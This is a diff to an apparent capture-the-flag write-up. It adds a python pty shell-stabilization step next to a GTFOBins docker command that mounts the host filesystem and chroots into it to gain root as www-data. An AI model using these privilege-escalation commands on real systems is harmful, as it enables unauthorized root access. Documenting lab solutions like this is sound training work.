@@ -73,7 +73,10 @@ If successful, you should now have the same permission levels as the binary you 
 
 - Look for `docker` on gtfobins.
 	![[Task 20 - Call me Mario, because I got all the bits-20240920151524586.webp]]
-	
+
+- Stabilize the shell.  
+	`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
 - Run the final command and spawn up that image with root permission.
 	www-data@ip-10-200-95-33:/var/www/html$ `/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash`
 	![[Task 20 - Call me Mario, because I got all the bits-20240920152724566.webp]]
